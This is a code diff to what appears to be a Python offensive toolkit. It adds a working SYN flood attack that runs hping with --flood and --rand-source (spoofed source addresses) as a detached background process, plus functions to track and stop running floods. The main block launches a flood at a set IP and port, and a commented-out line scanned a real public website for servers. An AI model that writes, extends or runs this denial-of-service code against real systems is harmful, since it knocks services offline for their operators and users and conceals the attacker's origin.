@@ -285,14 +285,166 @@ class Exploiter:
 
 class Attacker:
     def __init__(self):
-        pass
+        self.active_attacks = {}
     
-    def ddos(self, target_ip, target_port):
-        result = subprocess.run(["sudo", "hping", "-S", "-p", str(target_port), "--flood", "--rand-source", target_ip], capture_output=True, text=True)
-        if result.stdout:
-            return result.stdout
-        else:
-            return result.stderr
+    def flood(self, target_ip, target_port):
+        """
+        Launch a flood attack using hping3 in a background process
+        
+        Args:
+            target_ip: Target IP address
+            target_port: Target port number
+        
+        Returns:
+            Dictionary with attack information and PID
+        """
+        try:
+            # Start hping3 in background without waiting
+            process = subprocess.Popen(
+                ["sudo", "hping", "-S", "-p", str(target_port), "--flood", "--rand-source", str(target_ip)],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                start_new_session=True  # Detach from parent process
+            )
+            
+            # Wait briefly to capture any immediate errors
+            time.sleep(0.5)
+            
+            # Check if process is still running
+            poll_result = process.poll()
+            
+            if poll_result is not None:
+                # Process exited immediately - there was an error
+                stdout, stderr = process.communicate()
+                stdout_text = stdout.decode('utf-8', errors='ignore') if stdout else ''
+                stderr_text = stderr.decode('utf-8', errors='ignore') if stderr else ''
+                
+                print(f"STDOUT: {stdout_text}")
+                print(f"STDERR: {stderr_text}")
+                
+                return {
+                    'success': False,
+                    'target_ip': target_ip,
+                    'target_port': target_port,
+                    'error': 'Process exited immediately',
+                    'stdout': stdout_text,
+                    'stderr': stderr_text,
+                    'exit_code': poll_result,
+                    'message': f'Flood attack failed to start. STDERR: {stderr_text}'
+                }
+            
+            # Process is running - store it for later management
+            attack_id = f"{target_ip}:{target_port}"
+            self.active_attacks[attack_id] = process
+            
+            print(f"Flood attack launched successfully with PID: {process.pid}")
+            
+            return {
+                'success': True,
+                'target_ip': target_ip,
+                'target_port': target_port,
+                'pid': process.pid,
+                'attack_id': attack_id,
+                'message': f'Flood attack launched against {target_ip}:{target_port} (PID: {process.pid}). Use stop_flood() to terminate.'
+            }
+        except Exception as e:
+            import traceback
+            error_details = traceback.format_exc()
+            print(f"Exception occurred: {error_details}")
+            
+            return {
+                'success': False,
+                'target_ip': target_ip,
+                'target_port': target_port,
+                'error': str(e),
+                'traceback': error_details,
+                'message': f'Failed to launch flood attack: {str(e)}'
+            }
+    
+    def stop_flood(self, attack_id=None, target_ip=None, target_port=None):
+        """
+        Stop a running flood attack
+        
+        Args:
+            attack_id: The attack ID (format: "ip:port")
+            target_ip: Target IP (alternative to attack_id)
+            target_port: Target port (alternative to attack_id)
+        
+        Returns:
+            Dictionary with result
+        """
+        if not attack_id and target_ip and target_port:
+            attack_id = f"{target_ip}:{target_port}"
+        
+        if not attack_id:
+            return {
+                'success': False,
+                'error': 'Must provide either attack_id or both target_ip and target_port',
+                'message': 'Invalid parameters'
+            }
+        
+        if attack_id not in self.active_attacks:
+            return {
+                'success': False,
+                'attack_id': attack_id,
+                'error': 'Attack not found',
+                'message': f'No active attack found for {attack_id}'
+            }
+        
+        try:
+            process = self.active_attacks[attack_id]
+            pid = process.pid
+            process.terminate()
+            
+            # Wait briefly for termination
+            try:
+                process.wait(timeout=2)
+            except subprocess.TimeoutExpired:
+                # Force kill if it doesn't terminate
+                process.kill()
+                process.wait()
+            
+            del self.active_attacks[attack_id]
+            
+            return {
+                'success': True,
+                'attack_id': attack_id,
+                'pid': pid,
+                'message': f'Flood attack on {attack_id} stopped (PID: {pid})'
+            }
+        except Exception as e:
+            return {
+                'success': False,
+                'attack_id': attack_id,
+                'error': str(e),
+                'message': f'Failed to stop attack: {str(e)}'
+            }
+    
+    def list_active_attacks(self):
+        """
+        List all active flood attacks
+        
+        Returns:
+            Dictionary with active attacks information
+        """
+        active = {}
+        for attack_id, process in list(self.active_attacks.items()):
+            # Check if process is still running
+            if process.poll() is None:
+                active[attack_id] = {
+                    'pid': process.pid,
+                    'status': 'running'
+                }
+            else:
+                # Clean up terminated processes
+                del self.active_attacks[attack_id]
+        
+        return {
+            'success': True,
+            'active_attacks': active,
+            'count': len(active),
+            'message': f'{len(active)} active flood attack(s)'
+        }
 
 class Reporter:
     def __init__(self):
@@ -332,5 +484,5 @@ if __name__ == "__main__":
     # print(scanner.scan_entire_network())
     #print(exploiter.find_vulnerabilities_for_service("vsftpd"))
     attacker = Attacker()
-    print(scanner.find_website_servers("olx.com.pk"))
-    #print(attacker.ddos("192.168.100.102", "3000"))
+    #print(scanner.find_website_servers("olx.com.pk"))
+    print(attacker.flood("192.168.100.102", "3008"))
